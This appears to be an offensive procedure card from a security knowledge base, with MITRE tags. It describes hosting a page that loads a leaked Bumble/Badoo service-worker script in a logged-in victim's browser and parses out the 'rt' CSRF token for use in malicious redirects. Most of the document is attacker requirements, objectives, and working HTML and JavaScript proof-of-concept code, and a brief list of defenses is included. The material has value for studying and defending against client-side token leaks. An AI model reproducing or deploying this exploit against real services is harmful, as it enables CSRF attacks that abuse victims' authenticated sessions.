---
tags:
  - csrf
  - javascript
  - poc
  - client-side-exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 46e7d564-c787-4061-ae95-4dec893b5eb9
created_at: '2025-12-14T17:33:24.528Z'
updated_at: '2025-12-14T17:33:24.528Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Extract CSRF Token via Client-Side JavaScript PoC

## Summary

This procedure creates a proof-of-concept HTML page that loads Bumble's leaked JavaScript file and uses client-side JavaScript to parse and extract the 'rt' CSRF token, preparing it for use in malicious redirects.

## Description

Once the token leak is discovered, an attacker hosts a simple HTML page on a controlled domain (e.g., via GitHub Pages or a VPS). When the victim visits this page while authenticated in Bumble, the page loads the public chrome-service-worker.js, executes a parsing function to split the url_stats string by delimiters, and captures the 'rt' value. This extraction happens entirely client-side, leveraging the victim's browser context to access session-bound resources. The PoC then stores the token for immediate use in the next stage.

## Requirements

1. Hosting for a malicious HTML file (e.g., attacker-controlled website)
2. Victim's browser must load the page while logged into Bumble
3. Basic JavaScript knowledge for PoC scripting

## Defense

Defensive measures and detection strategies:

- Obfuscate or remove tokens from static JS files; use short-lived, non-static tokens
- Enforce strict referrer policies and CSP to block cross-origin script execution
- Detect unusual client-side script loads via browser telemetry or WAF rules

## Objectives

1. Automate token extraction without manual inspection
2. Ensure extraction ties to victim's session
3. Prepare token for seamless integration into exploit URL

## Instructions

### Step 1: Create PoC HTML Structure

**Context**: Build the base HTML to load the target JS file.

Create an HTML file with a script tag to include the service worker:

```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script src="https://eu1.badoo.com/worker-scope/chrome-service-worker.js"></script>
<script> // Parsing function here </script>
</body>
</html>
```

> This loads the JS in the victim's browser context.

### Step 2: Implement Extraction Function

**Context**: Add JavaScript to parse and capture the 'rt' token.

Insert the following function after loading the script:

```javascript
function getCSRFcode(str) {
  var parts = str.split('rt=');
  return parts[1] ? parts[1].split('&')[0] : null;
}
// Assume url_stats is now available; extract
var csrf_code = getCSRFcode(url_stats);
console.log(csrf_code); // For verification
```

> The function splits on 'rt=' and takes the value until the next '&'. On load, csrf_code holds the token. Verify in browser console.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[JavaScript]]
- [[poc]]
